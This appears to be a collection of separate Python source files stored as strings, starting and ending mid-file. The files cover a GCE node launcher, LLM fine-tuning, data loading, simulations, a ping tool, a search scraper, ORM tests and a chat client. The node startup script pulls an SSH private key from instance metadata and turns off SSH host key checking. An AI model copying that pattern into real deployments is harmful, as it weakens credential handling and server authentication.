Metadata,\n    Items,\n    AccessConfig,\n    ServiceAccount,\n    Tags,\n    InstancesClient,\n    Instance,\n)\n\nfrom main_service import PROJECT_ID, TZ\nfrom main_service.helpers import get_secret, Logger\n\n# This was guessed\nTOTAL_BOOT_TIME = timedelta(seconds=60 * 4)\nTOTAL_REBOOT_TIME = timedelta(seconds=60 * 2)\n\n# default compute engine svc account\nGCE_DEFAULT_SVC = \"140225958505-compute@developer.gserviceaccount.com\"\n\nNODE_START_TIMEOUT = 60 * 5\nNODE_SVC_PORT = \"8080\"\nACCEPTABLE_ZONES = [\"us-central1-a\", \"us-central1-b\", \"us-central1-c\", \"us-central1-f\"]\nNODE_SVC_VERSION = \"v0.1.37\"  # <- this maps to a git tag /  github release\nNODE_STARTUP_SCRIPT = f\"\"\"\n#! /bin/bash\n# This script installs and starts the node service \n# This script uses git instead of the github api because the github api SUCKS\n\n# Increases max num open files so we can have more connections open.\nulimit -n 4096\n\nMETADATA_SVC_HOST=\"http://metadata.google.internal\"\nPRIVATE_KEY_URL=\"$METADATA_SVC_HOST/computeMetadata/v1/instance/attributes/ssh-private-key\"\ncurl $PRIVATE_KEY_URL -H \"Metadata-Flavor: Google\" > /root/.ssh/id_rsa\nchmod 600 ~/.ssh/id_rsa\n\neval \"$(ssh-agent -s)\"\nssh-add /root/.ssh/id_rsa\n\n# This needs to be here, I can't figure out how to remove it from the image.\nrm -rf node_service\n\nexport GIT_SSH_COMMAND=\"ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no\"\n# git clone --depth 1 --branch {NODE_SVC_VERSION} git@github.com:Burla-Cloud/node_service.git\ngit clone --depth 1 git@github.com:Burla-Cloud/node_service.git\ncd node_service\npython3.11 -m pip install --break-system-packages .\n\nexport IN_PRODUCTION=\"{os.environ.get('IN_PRODUCTION')}\"\npython3.11 -m uvicorn node_service:app --host 0.0.0.0 --port 8080 --workers 1 --timeout-keep-alive 600\n\"\"\"\n\n\nclass Node:\n    \"\"\"\n    This class is designed to be called only by the `main_service.cluster.Cluster` class.\n\n    TODO: Error not thrown when `start` called with accellerator optimized machine type ??\n    \"\"\"\n\n    def __init__(self):\n        # Prevents instantiation of nodes that do not exist.\n        err_msg = \"Please use `Node.start`, `Node.start_and_execute`, or `Node.from_previous_state`\"\n        raise NotImplementedError(err_msg)\n\n    @classmethod\n    def _init(\n        cls,\n        db: firestore.Client,\n        logger: Logger,\n        background_tasks: BackgroundTasks,\n        instance_name: str,\n        machine_type: str,\n        started_booting_at: datetime,\n        finished_booting_at: Optional[datetime] = None,\n        delete_when_done: bool = False,\n        host: Optional[str] = None,\n        zone: Optional[str] = None,\n        current_job: Optional[str] = None,\n        parallelism: Optional[int] = None,\n        instance_client: Optional[InstancesClient] = None,\n    ):\n        self = cls.__new__(cls)\n        self.db = db\n        self.logger = logger\n        self.background_tasks = background_tasks\n        self.instance_name = instance_name\n        self.machine_type = machine_type\n        self.started_booting_at = started_booting_at\n        self.finished_booting_at = finished_booting_at\n        self.delete_when_done ",
    "import os\nimport argparse\n\nimport torch\nfrom trl import SFTTrainer\nfrom datasets import load_dataset\nfrom transformers import TrainingArguments\nfrom transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig\nfrom peft import LoraConfig, prepare_model_for_kbit_training, get_peft_model\n\n\ndef print_trainable_parameters(model):\n    \"\"\"\n    Prints the number of trainable parameters in the model.\n    \"\"\"\n    trainable_params = 0\n    all_param = 0\n    for _, param in model.named_parameters():\n        all_param += param.numel()\n        if param.requires_grad:\n            trainable_params += param.numel()\n    print(f\"trainable params: {trainable_params} || all params: {all_param} || trainable%: {100 * trainable_params / all_param}\")\n\n\ndef format_instruction(sample):\n    prompt_persona = f'''Person B has the following Persona information.'''\n    \n    for ipersona in sample['persona_b']:\n        prompt_persona += f'''Persona of Person B: {ipersona}\\n'''\n    \n    prompt = f'''{prompt_persona} \\nInstruct: Person A and Person B are now having a conversation.  Following the conversation below, write a response that Person B would say base on the above Persona information. Please carefully consider the flow and context of the conversation below, and use the Person B's Persona information appropriately to generate a response that you think are the most appropriate replying for Person B.\\n'''\n\n    for iturn in sample['dialogue']:\n        prompt += f'''{iturn}\\n'''\n        \n    prompt += \"Output:\\n\" \n    prompt += sample[\"reference\"]\n    return prompt\n    \n\ndef finetune_model(args):\n    dataset = load_dataset(args.dataset, token=args.auth_token, split=\"train\")\n    # base model to finetune\n    model_id = args.base_model\n\n    # BitsAndBytesConfig to quantize the model int-4 config\n    bnb_config = BitsAndBytesConfig(\n        load_in_4bit=True,\n        bnb_4bit_use_double_quant=False,\n        bnb_4bit_quant_type=\"nf4\",\n        bnb_4bit_compute_dtype=torch.bfloat16\n    )\n    \n    # load model and tokenizer\n    model = AutoModelForCausalLM.from_pretrained(model_id, quantization_config=bnb_config, device_map=\"auto\", trust_remote_code=True)\n    model.config.pretraining_tp = 1\n    \n    tokenizer = AutoTokenizer.from_pretrained(model_id, trust_remote_code=True)\n    tokenizer.pad_token = tokenizer.eos_token\n    \n    # LoRA config based on QLoRA paper\n    peft_config = LoraConfig(\n        r=16,\n        lora_alpha=16,\n        target_modules=[\n            \"Wqkv\",\n            \"fc1\",\n            \"fc2\",\n        ],\n        bias=\"none\",\n        lora_dropout=0.05,\n        task_type=\"CAUSAL_LM\",\n    )\n\n    # prepare model for training\n    # Phi 2 doesn't support gradient checkpointing\n    model = prepare_model_for_kbit_training(model, use_gradient_checkpointing=False)\n    model = get_peft_model(model, peft_config)\n    \n    # print the number of trainable model params\n    print_trainable_parameters(model)\n    \n    model_args = TrainingArguments(\n        output_dir=\"phi-2-persona-chat\",\n        num_train_epochs=1,\n        per_device_train_batch_size=1,\n        gradient_accumulation_steps=1,\n        gradient_checkpointing=False,\n        optim=\"paged_adamw_32bit\",\n        logging_steps=20,\n        save_strategy=\"epoch\",\n        learning_rate=2e-4,\n        bf16=False,\n        tf32=False,\n        max_grad_norm=0.3,\n        warmup_ratio=0.03,\n        lr_scheduler_type=\"constant\",\n        disable_tqdm=False\n    )\n    \n    max_seq_length = 1024\n\n    trainer = SFTTrainer(\n        model=model,\n        train_dataset=dataset,\n        peft_config=peft_config,\n        max_seq_length=max_seq_length,\n        tokenizer=tokenizer,\n        packing=True,\n        formatting_func=format_instruction,\n        args=model_args,\n    )\n    \n    # train\n    trainer.train() \n    \n    # save model to local\n    trainer.save_model()\n\n    if args.push_to_hub:\n        trainer.model.push_to_hub(args.model_name, token=args.auth_token)\n        tokenizer.push_to_hub(args.model_name, token=args.auth_token)\n        \n    torch.cuda.empty_cache()\n\n    \nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--dataset\", type=str, default=\"nazlicanto/persona-based-chat\", \n        help=\"Path to local or HF dataset.\"\n    )\n    parser.add_argument(\n        \"--base_model\", type=str, default=\"microsoft/phi-2\", \n        help=\"HF hub id of the base model to finetune.\"\n    )\n    parser.add_argument(\n        \"--model_name\", type=str, default=\"phi-2-persona-chat\", help=\"Name of finetuned model.\"\n    )\n    parser.add_argument(\n        \"--auth_token\", type=str, default=None, \n        help=\"HF authentication token, only used if downloading a private dataset.\"\n    )\n    parser.add_argument(\n        \"--push_to_hub\", default=False, action=\"store_true\", \n        help=\"Whether to push finetuned model to HF hub.\"\n    )\n    args = parser.parse_args()\n    finetune_model(args)",
    "import os\nimport re\nimport cv2\nimport time\nimport copy\nimport json\nimport torch\nimport random\nimport pickle\nimport numpy as np\nimport torch.distributed as dist\nfrom torch.utils.data import Dataset\nfrom torch.utils.data import DataLoader\nfrom torch.utils.data.sampler import Sampler\nfrom transformers import PreTrainedTokenizerFast\nfrom config import CLIPConfig_medium\nfrom torchvision.transforms.functional import rotate, resize, adjust_brightness, adjust_saturation, adjust_hue, adjust_contrast, InterpolationMode\n\nclass GPTDataset(Dataset):\n    def __init__(self, token_dump_path, transform=None):\n        self.transform = transform\n        self.images, self.tokens = [], []\n        self.image_list, self.token_list, self.len_list = [], [], []\n        self.len = 0\n        for tp, snum in token_dump_path:\n            images, tokens = pickle.load(open(tp, 'rb'))\n            self.image_list.append(images)\n            self.token_list.append(tokens)\n            self.len_list.append(snum)\n            self.len += snum if snum else len(images)\n    \n    def __len__(self):\n        return self.len\n    \n    def prepare_sample(self, index):\n        index %= 8\n        self.images, self.tokens = [], []\n        for images, tokens, slen in zip(self.image_list, self.token_list, self.len_list):\n            if slen:\n                self.images += images[index * slen : (index + 1) * slen]\n                self.tokens += tokens[index * slen : (index + 1) * slen]\n            else:\n                self.images += images\n                self.tokens += tokens\n\n    def __getitem__(self, index):\n        img = cv2.imread(self.images[index])\n        img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n        img = torch.from_numpy(img).permute(2, 0, 1).contiguous()\n        if self.transform:\n            img = self.transform(img)\n        token_id = np.random.randint(len(self.tokens[index]))\n        return img/255., self.tokens[index][token_id]\n\nclass ImageTransformer(object):\n    def __init__(self, img_size):\n        self.img_size = img_size\n\n    def get_size(self, scale_h):\n        t_top = s_top = 0\n        t_bottom = s_bottom = self.img_size\n        if scale_h > self.img_size:\n            t_top = 0\n            t_bottom = self.img_size\n            s_top = np.random.randint(0, scale_h - self.img_size)\n            s_bottom = s_top + self.img_size\n        elif scale_h < self.img_size:\n            t_top = np.random.randint(0, self.img_size - scale_h)\n            t_bottom = t_top + scale_h\n            s_top = 0\n            s_bottom = scale_h\n        return t_top, t_bottom, s_top, s_bottom\n\n    def __call__(self, img):\n        _, H, W = img.shape\n        # cv2.imshow('x', img.permute(1,2,0).numpy())\n        scale_ratio = np.random.uniform(0.8, 1.2) * self.img_size / max(H, W)\n        scale_h = np.random.uniform(0.9, 1.1) * H\n        scale_w = np.random.uniform(0.9, 1.1) * W\n        scale_h2 = int(scale_h * scale_ratio)\n        scale_w2 = int(scale_w * scale_ratio)\n\n        angle = np.random.uniform(-5.0, 5.0)\n        brightness = np.random.uniform(0.9, 1.1)\n        contrast = np.random.uniform(0.9, 1.1)\n        saturation = np.random.uniform(0.9, 1.1)\n        hue = np.random.uniform(-0.02, 0.02)\n        \n        img = resize(img, [scale_h2, scale_w2], InterpolationMode.NEAREST)\n        img_new = torch.zeros((3, self.img_size, self.img_size), dtype=img.dtype)\n        t_top, t_bottom, s_top, s_bottom = self.get_size(scale_h2)\n        t_left, t_right, s_left, s_right = self.get_size(scale_w2)\n        img_new[:, t_top : t_bottom, t_left : t_right] = img[:, s_top : s_bottom, s_left : s_right]\n        \n        img_new = rotate(img_new, angle)\n        img_new = adjust_brightness(img_new, brightness)\n        img_new = adjust_contrast(img_new, contrast)\n        img_new = adjust_saturation(img_new, saturation)\n        img_new = adjust_hue(img_new, hue)\n        # cv2.imshow('y', img_new.permute(1,2,0).numpy())\n        # cv2.waitKey(0)\n        return img_new\n\nclass RandSampler(Sampler):\n    def __init__(self, data_source, batch_size, drop_last, shuffle=True):\n        self.batch_size = batch_size\n        self.order = list(range(len(data_source)))\n        self.total_size = len(self.order) - len(self.order) % self.batch_size\n        if not drop_last: self.total_size += batch_size\n\n        if shuffle: random.shuffle(self.order)\n        self.groups = []\n        for i in range(0, self.total_size, self.batch_size):\n            self.groups.append([self.order[x % len(self.order)] for x in range(i, i + self.batch_size)])\n\n    def shuffle(self, epoch=0):\n        random.shuffle(self.order)\n        self.groups = []\n        for i in range(0, self.total_size, self.batch_size):\n            self.groups.append([self.order[x % len(self.order)] for x in range(i, i + self.batch_size)])\n\n    def __iter__(self):\n        for group in self.groups:\n            yield group\n\n    def __len__(self):\n        return len(self.groups)\n\nclass DistRandSampler(Sampler):\n    def __init__(self, data_source, bat",
    "'''\n    Configuration functions to initialize simulations\n'''\n\nimport numpy as np\n\nfrom agent import Agent\nfrom obstacles import Obstacle\n\ndef generate_graph(n=3, random=False):\n    \n    '''\n        Generate the connectivity square matrix it must be connected:\n            n -> number of agents, by default is 3\n            random -> if the graph is random or not, by default is not and it is considered \n                      a inmediate neighbor network\n    '''\n    \n    if random:\n        pass\n    \n    else:\n        \n        L = np.zeros((n, n))\n        \n        for i in range(n):\n            for j in range(n):\n                \n                if i == j:\n                    \n                    L[i][j] = 1\n                    \n                    if i == n-1:\n                        L[i][0] = -1\n                    \n                elif j == i+1:\n                    L[i][j] = -1\n        # L = np.array([[3, -1, -1, -1, 0, 0],\n        #               [-1, 3, 0, 0, -1, -1],\n        #               [-1, 0, 2, -1, 0, 0],\n        #               [-1, 0, -1, 2, 0, 0],\n        #               [0, -1, 0, 0, 2, -1],\n        #               [0, -1, 0, 0, -1, 2]])\n    \n    return L\n\ndef desired_references(agents, leader, distance=4.0, shape=0):\n    \n    '''\n        Set the desired realtive references between agents according differente shapes rotation fixed\n            shape    -> 0 - Circle around leader\n                        1 - Triangular, leader in front\n                        2 - \n            distance -> set the distance between each agent, this must be in the constraints\n    '''\n    \n    if len(agents) >= 2:\n        \n        if shape == 0:\n            # Circular formation\n            \n            alpha = 2*np.pi / len(agents) # Angular displacement\n            r = (distance/2) / np.sin(alpha)\n            # constAngle = (np.pi - alpha) + (alpha/2)\n            # n = 1 # Number of agent\n            for agent in agents:\n                \n                aux = []\n                for i in agent.neighbors_:\n                    aux.append(agents[i-1])\n                agent.neighbors_ = aux\n                agent.disired_distance_ = distance\n                agent.generate_displacement_variables(leader)\n                \n            #     if agent.id_ == 1:\n            #         # Considere that the agent id:1 is connected with the leader\n                    \n            #         agent.l_displacement_x_ = r*np.cos(alpha)\n            #         agent.l_displacement_y_ = r*np.sin(alpha)\n                \n            #     # Displacement angle \n            #     theta = constAngle + n*alpha\n            #     if theta >= 2*np.pi:\n            #         theta -= 2*np.pi\n\n            #     # Adding the reference with respect to the neighbors\n            #     for neighbor in agent.displacement_:\n\n            #         x = distance*np.cos(theta)\n            #         y = distance*np.sin(theta)\n                    \n            #         agent.displacement_[neighbor] = [x, y]\n                    \n            #     n += 1\n                \n                # Consider around the leader\n                agent.desired_position_[0] = r*np.cos(agent.id_ * alpha)\n                agent.desired_position_[1] = r*np.sin(agent.id_ * alpha)\n                agent.distance_between_agents_ = distance\n                \n    else: # Till this moment we suppose that the one agent reachs the consensus with the leader\n        \n        agents[0].generate_displacement_variables(leader)\n        agents[0].distance_between_agents_ = 0.0\n\ndef initial_conditions(agent, center, neighbors, random, maxD=10.0, minD=5.0):\n    \n    '''\n        Generate the connectivity square matrix it must be connected:\n            agents -> List with the agents (object) to modify their initial conditions\n            random -> if the initial positions will be randomly generated\n            center -> position of the center of the sample\n            maxD   -> maximun distance from the center \n            minD   -> minimum distance from the center \n    '''\n    \n    agent.neighbors_ = neighbors\n    \n    if random:\n    \n        r = np.random.uniform(minD, maxD)\n        angle = np.random.uniform(-np.pi, np.pi)\n        \n        x = center[0] + r*np.cos(angle)\n        y = center[1] + r*np.sin(angle)\n        \n    else: \n        \n        r = np.random.uniform(minD, maxD)\n        # r = np.random.uniform(1.0, 2.0)\n        angle = np.random.uniform(-np.pi, np.pi)\n        \n        x = -center[0] + r*np.cos(angle)\n        y = -center[1] + r*np.sin(angle)\n    \n    agent.x_ = x\n    agent.y_ = y\n    \ndef generate_agents(n, L, obstacles, random=True, lPosition=[0, 0], CBFmethod=3):\n    '''\n        Generate the agents (object) and initiliza their parameters\n            n         -> number of agents\n            random    -> if the initial positions will be randomly generated\n            lPosition -> initial position of the leader\n    '''\n    \n    leader = Agent(leader=True, pos=lPosition, vel=[0.0, 0.3], acc=[",
    "from pynput import keyboard\nfrom pynput import mouse\n\nclass Listener:\n    def __init__(self):\n        self.mouse_listener = mouse.Listener(on_click=self.on_click)\n        self.keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)\n        self.tag_right = False\n        self.tag_x1 = False\n        self.tag_shift = False\n    \n    def on_click(self, x, y, button, pressed):\n         if pressed:\n            if button == mouse.Button.right:\n                self.tag_right = not self.tag_right\n                print(f'tag_right: {self.tag_right}')\n            elif button == mouse.Button.x1:\n                self.tag_x1 = not self.tag_x1\n                print(f'tag_x1: {self.tag_x1}')\n\n    def on_press(self, key):\n            if key == keyboard.Key.shift_r:\n                self.tag_shift = not self.tag_shift\n                print(f'tag_shift: {self.tag_shift}')\n\n    def on_release(self, key):\n        if key == keyboard.Key.esc:\n            # \u6309\u4e0bESC\u952e\u9000\u51fa\u76d1\u542c\n            self.mouse_listener.stop()\n            self.keyboard_listener.stop()\n            return False\n        \n    def start(self):\n        # self.mouse_listener.start()\n        self.keyboard_listener.start()\n        # self.mouse_listener.join()\n        self.keyboard_listener.join()\n\nif __name__ == '__main__':\n\n    listener = Listener()\n    listener.start()\n",
    "import argparse\nimport requests\nimport threading\nimport pycountry\n\ndef ping(host, countries):\n    global avg_ping, avg_loss\n    if not host.replace('.', '').isnumeric():\n        url = f'https://cloudflare-dns.com/dns-query?name={host}&type=A'\n        host = requests.get(url, headers={'Referer': 'https://console.zenlayer.com', 'Accept': 'application/dns-json'}).json()\n        if 'Answer' in host:\n            host = host['Answer'][0]['data']\n        else:\n            print(\"Couldn't resolve host via CloudFlare. Exiting.\")\n            raise SystemExit\n\n    locations, name_location, avg_ping, avg_loss = [], [], [], []\n    list = requests.get('https://console.zenlayer.com/lgApi/api/devices')\n    if list.status_code != 200:\n        print('Error while fetching nodes. Exiting.')\n        raise SystemExit\n    for i in list.json():\n        name = i['name'].replace(' ', '_').replace('(', '').replace(')', '').lower().replace(',', '')\n        name_location.append({'name': name, 'normalized': i['name']})\n        locations.append(name)\n\n    threads = []\n    for location in locations:\n        if not countries or location[:2].upper() in countries:\n            thread = threading.Thread(target=check_ping, args=(host, location, name_location))\n            thread.start()\n            threads.append(thread)\n\n    if not threads:\n        print('No nodes with that country. Exiting.')\n    else:\n        for thread in threads:\n            thread.join()\n        print(f'Average ping: {sum(avg_ping) // len(avg_ping)} ms - Average loss: {sum(avg_loss) // len(avg_loss)}%')\ndef check_ping(host, location, name_location):\n    for i in name_location:\n        if i['name'] == location:\n            location_n = i['normalized']\n            break   \n    payload = {\"query_vrf\": \"global\", \"query_location\": location, \"query_type\": \"ping\", \"query_target\": host}\n    response = requests.post(f'https://console.zenlayer.com/lgApi/api/query/', json=payload)\n    if response.text.startswith('{\"output\":'):\n        try:\n            ping = response.json()['output'].split('min/avg/max')[1].split('/')[2]\n            loss = int(response.json()['output'].split('received,')[1].split('%')[0])\n        except:\n            if 'Error connecting to' in response.json()['output']:\n                status = 'Node offline'\n            else:\n                status = 'Error on node'\n            ping = '0 ms'\n            loss = 100\n        status = 'Online' if loss < 50  else 'Offline'\n        if location_n[:2].isalpha():\n            location_n = f'{pycountry.countries.get(alpha_2=location_n[:2]).flag} {location_n[2:]}'\n        print(f'{location_n} - {status} - {ping} - {loss}% loss {\"- CACHED\" if \"cached\" in response.json() and response.json()[\"cached\"] else \"\"}')\n        avg_ping.append(int(ping.split('.')[0].replace('ms', ''))), avg_loss.append(loss)\n    else:\n        print(f'Error while pinging from location: {location_n} \\n Recieved: {response.text}')\n\ndef list_countries():\n    list = requests.get('https://console.zenlayer.com/lgApi/api/devices').json()\n    countries = []\n    for i in list:\n        countries.append(i['name'])\n    print(countries)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Ping tool')\n    parser.add_argument('--host', help='Host to ping')\n    parser.add_argument('--country', nargs='+', help='Countries to ping from')\n    parser.add_argument('--list', action='store_true', help='List all nodes')\n    args = parser.parse_args()\n    if args.list:\n        list_countries()\n        raise SystemExit\n    if not args.host:\n        print('Please provide a host to ping. Exiting.')\n        raise SystemExit\n    ping(args.host, args.country)\n",
    "from serpapi import GoogleSearch\nimport csv\n\ninput_filename = 'keywords.csv'\n\noutput_filename = 'forum_results.csv'\n\ndef get_forum_results(keyword):\n        params = {\n            'engine': 'google',\n            'q': keyword,\n            'api_key': '[YOUR API KEY]',\n            'location': 'United States',\n            'google_domain': 'google.com',\n            'gl': 'us',\n            'hl': 'en',\n            \"device\": \"mobile\",\n        }\n        search = GoogleSearch(params)\n        results = search.get_dict()\n        discussions_and_forums = results[\"discussions_and_forums\"]\n        return discussions_and_forums\n\nkeywords = []\nwith open(input_filename, mode='r', newline='', encoding='utf-8') as file:\n    reader = csv.reader(file)\n    next(reader, None)  # Skip the header if there is one\n    for row in reader:\n        keywords.append(row[0])\n\nwith open(output_filename, mode='w', newline='', encoding='utf-8') as file:\n    writer = csv.writer(file)\n    for keyword in keywords:\n        print(keyword)\n        try:\n            discussionresults = get_forum_results(keyword)\n            for i in discussionresults:\n                title = i['title']\n                print(title)\n                link = i['link']\n                date = i['date']\n                domain = i['source']\n                writer.writerow([keyword,title,link,date,domain])\n        except:\n            continue\n",
    "from typing import Any\nimport sqlite3\nfrom collections import namedtuple\nfrom dataclasses import dataclass\nfrom datetime import date, datetime, timezone\nfrom decimal import Decimal\nfrom hashlib import sha1\n\nimport pytest\nimport noorm.sqlite3 as nm\n\n\n@pytest.fixture\ndef tst_conn():\n    with sqlite3.connect(\":memory:\") as conn:\n        conn.execute(\n            \"\"\"\n            create table users(\n                username text,\n                email text,\n                birthdate text,  -- date\n                salary text,  -- decimal\n                last_seen text,  -- datetime\n                password_hash blob\n            );\n            \"\"\"\n        )\n        conn.execute(\n            \"\"\"\n            insert into users(\n                username, email, birthdate, salary, last_seen, password_hash\n            )\n            values('John', 'john@doe.com', NULL, '1234.56',\n                '2023-05-14T12:34:56+00:00', ?);\n            \"\"\",\n            (sha1(b\"123456\").digest(),),\n        )\n        conn.execute(\n            \"\"\"\n            insert into users(username, email, birthdate, salary, last_seen)\n            values('Jane', 'jane@doe.com', '1982-04-27', NULL, NULL);\n            \"\"\"\n        )\n        conn.commit()\n        yield conn\n\n\n# MARK: sql_fetch_all\n\n\n@nm.sql_fetch_all(\n    namedtuple(\"AllUsersResult\", \"id,username\"),\n    \"select rowid as id, username from users order by rowid\",\n)\ndef get_all_users_namedtuple():\n    pass\n\n\ndef test_fetch_all(tst_conn: sqlite3.Connection):\n    got = get_all_users_namedtuple(tst_conn)\n    assert len(got) == 2\n    rtype = type(got[0])\n    assert got == [rtype(1, \"John\"), rtype(2, \"Jane\")]\n\n    cur = tst_conn.cursor()\n    got = get_all_users_namedtuple(cur)\n    assert got == [rtype(1, \"John\"), rtype(2, \"Jane\")]\n\n\n@nm.sql_fetch_all(\n    namedtuple(\"AllUsersResult\", \"id,username\"),\n    \"select rowid as id, username from users where rowid > :id order by rowid\",\n)\ndef get_all_users_wrong1(id_: int):\n    return id_\n\n\n@nm.sql_fetch_all(namedtuple(\"AllUsersResult\", \"id,username\"))\ndef get_all_users_wrong2(id_: int):\n    sql = \"select rowid as id, username from users where rowid > :id order by rowid\"\n    return nm.query_and_params(sql, id_, id=id_)\n\n\n@nm.sql_fetch_all(namedtuple(\"AllUsersResult\", \"id,username\"))\ndef get_all_users_wrong3(id_: int):\n    return nm.params(id=id_)\n\n\ndef test_fetch_all_wrong(tst_conn: sqlite3.Connection):\n    with pytest.raises(TypeError):\n        _ = get_all_users_wrong1(tst_conn, 1)\n    with pytest.raises(ValueError):\n        _ = get_all_users_wrong2(tst_conn, 1)\n    with pytest.raises(RuntimeError):\n        _ = get_all_users_wrong3(tst_conn, 1)\n\n\n@dataclass\nclass UInfo:\n    id: int\n    username: str\n    email: str | None\n    birthdate: date | None\n    salary: Decimal | None\n    last_seen: datetime | None\n\n\n@nm.sql_fetch_all(\n    UInfo,\n    \"\"\"select rowid as id, username, email, birthdate, salary, last_seen\n    from users where username like :search or email like :search\n    order by rowid\"\"\",\n)\ndef find_users_by_text(search: str):\n    if not search:\n        raise nm.CancelExecException\n    return nm.params(search=f\"%{search}%\")\n\n\ndef test_fetch_find(tst_conn: sqlite3.Connection):\n    got = find_users_by_text(tst_conn, \"doe\")\n    assert got == [\n        UInfo(\n            id=1,\n            username=\"John\",\n            email=\"john@doe.com\",\n            birthdate=None,\n            salary=Decimal(\"1234.56\"),\n            last_seen=datetime(2023, 5, 14, 12, 34, 56, tzinfo=timezone.utc),\n        ),\n        UInfo(\n            id=2,\n            username=\"Jane\",\n            email=\"jane@doe.com\",\n            birthdate=date(1982, 4, 27),\n            salary=None,\n            last_seen=None,\n        ),\n    ]\n    got = find_users_by_text(tst_conn, None)\n    assert got == []\n\n\n# MARK: sql_one_or_none\n\n\n@dataclass\nclass UData:\n    id: int\n    username: str\n\n\n@nm.sql_one_or_none(UData, \"select rowid as id, username from users where rowid=:id\")\ndef get_user_by_id(id_: int):\n    return nm.params(id=id_)\n\n\ndef test_one_or_none(tst_conn: sqlite3.Connection):\n    user_info = get_user_by_id(tst_conn, 1)\n    assert user_info == UData(id=1, username=\"John\")\n\n    user_info = get_user_by_id(tst_conn, 999)\n    assert user_info is None\n\n\n# MARK: sql_scalar_or_none\n\n\n@nm.sql_scalar_or_none(int, \"select count(*) from users;\")\ndef get_users_count():\n    return nm.query_only(None)\n\n\n@nm.sql_scalar_or_none(date)\ndef get_users_min_birthday(birthdate_from: date | None = None):\n    sql = \"select min(birthdate) from users where true --where_cond--\"\n    if birthdate_from is None:\n        return nm.query_only(sql)\n    return nm.query_and_params(\n        sql.replace(\"--where_cond--\", \"and birthdate >= ?\"),\n        birthdate_from.isoformat(),\n    )\n\n\n@nm.sql_scalar_or_none(int)\ndef get_random_user_id(id_from: int | None = None):\n    sql = \"\"\"\n        select rowid from users\n        where true --where_cond--\n        order by random() limit 1\n    \"\"\"\n    if id_from is None:\n        return nm.que",
    "from pathlib import Path\nimport random\n\nimport fire\nimport numpy as np\nimport pandas as pd\nfrom tqdm import tqdm\nfrom rouge_score import rouge_scorer, scoring\n\nfrom util import legal_sent_tokenize\n\n\ndef eval_baseline(\n    articles, abstracts, token_budget=None, sent_budget=None, randomize=False\n):\n    rouge = rouge_scorer.RougeScorer(\n        [\"rouge1\", \"rouge2\", \"rougeL\", \"rougeLsum\"], use_stemmer=True\n    )\n    aggregator = scoring.BootstrapAggregator()\n\n    sents_per_summary = []\n    tokens_per_summary = []\n    tokens_per_abstract = []\n    scores = {}\n    summaries = []\n\n    if token_budget is None and sent_budget is None:\n        token_budget = [\n            sum([len(sent.split()) for sent in abstract]) for abstract in abstracts\n        ]\n        token_budget = int(np.mean(token_budget))\n        print(f\"Using a budget of {token_budget} tokens\")\n\n    for article, abstract in tqdm(zip(articles, abstracts)):\n        sents = []\n        tokens = 0\n\n        if not isinstance(article, list):\n            article = legal_sent_tokenize(article)\n\n        if not isinstance(abstract, list):\n            abstract = [abstract]\n\n        if randomize:\n            article = random.sample(article, len(article))\n\n        for sent in article:\n            sent_tokens = len(sent.split())\n\n            if token_budget and tokens >= token_budget:\n                break\n\n            if sent_budget and len(sents) >= sent_budget:\n                break\n\n            sents.append(sent)\n            tokens += sent_tokens\n\n        sents_per_summary.append(len(sents))\n        tokens_per_summary.append(tokens)\n        abstract_tokens = sum([len(s.split()) for s in abstract])\n        tokens_per_abstract.append(abstract_tokens)\n\n        score = rouge.score(\"\\n\".join(abstract), \"\\n\".join(sents))\n        aggregator.add_scores(score)\n        summaries.append(\"\\n\".join(sents))\n\n    print(\"Avg sentences per summary:\", np.mean(sents_per_summary))\n    print(\"Avg tokens per abstract:\", np.mean(tokens_per_abstract))\n    print(\"Avg tokens per summary:\", np.mean(tokens_per_summary))\n    print()\n\n    scores = aggregator.aggregate()\n\n    for k, v in sorted(scores.items()):\n        print(\"%s-R,%f,%f,%f\" % (k, v.low.recall, v.mid.recall, v.high.recall))\n        print(\"%s-P,%f,%f,%f\" % (k, v.low.precision, v.mid.precision, v.high.precision))\n        print(\"%s-F,%f,%f,%f\\n\" % (k, v.low.fmeasure, v.mid.fmeasure, v.high.fmeasure))\n\n    return scores, summaries\n\n\ndef run(\n    data_path,\n    token_budget=100,\n    source=\"text\",\n    target=\"summary\",\n    random=True,\n    output_path=None,\n):\n    data = pd.read_csv(data_path)\n    paragraphs_path = Path(data_path).parent / f\"paragraphs_{Path(data_path).name}\"\n    \n    if Path(paragraphs_path).exists():\n        paragraphs = pd.read_csv(paragraphs_path)\n        print(11, paragraphs.columns)\n        data[\"oracle_paragraphs\"] = paragraphs[\"oracle_paragraphs\"]\n\n    data = data.fillna(\"\")\n    _, summaries = eval_baseline(\n        data[source], data[target], token_budget=token_budget, randomize=random\n    )\n    if output_path:\n        output_data = {\"prediction\": summaries, \"reference\": data[target]}\n        pd.DataFrame(output_data).to_csv(output_path, index=None)\n\n\nif __name__ == \"__main__\":\n    fire.Fire(run)\n",
    "import logging\nimport argparse\nimport openai\nfrom openai import OpenAI\nimport time\nimport socket\n\nfrom remote import RemoteLLMs\n\n\ndef read_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--config_path\", type=str, default=\"configs/cjh_glm3.json\")\n    args = parser.parse_args()\n    return args\n\n\nclass ChatGLMLLM(RemoteLLMs):\n    def init_local_client(self):\n        try:\n            self.model = self.args['model']\n            client = OpenAI(api_key=self.args['api_key'], base_url=self.args['base_url'])\n            return client\n        except:\n            return None\n\n    def create_prompt(self, current_query, context=None):\n        if context is None:\n            context = []\n        context.append(\n            {\n                \"role\": \"user\",\n                \"content\": current_query,\n            }\n        )\n        return context\n\n    def request_llm(self, context, seed=1234, sleep_time=1, repeat_times=0, use_stream=False, max_length=100,\n                    temperature=0.5, top_p=1.0):\n        while True:\n            try:\n                response = self.client.chat.completions.create(\n                    model=self.model,\n                    messages=context,\n                    stream=use_stream,\n                    max_tokens=max_length,\n                    temperature=temperature,\n                    top_p=top_p,\n                    seed=seed + repeat_times,\n                    n=1\n                )\n                if not use_stream:\n                    context.append(\n                        {\n                            'role': response.choices[0].message.role,\n                            'content': response.choices[0].message.content\n                        }\n                    )\n                    return context\n                else:\n                    return response\n            except openai.RateLimitError as e:\n                logging.error(str(e))\n                raise e\n            except (openai.APIError, openai.InternalServerError, 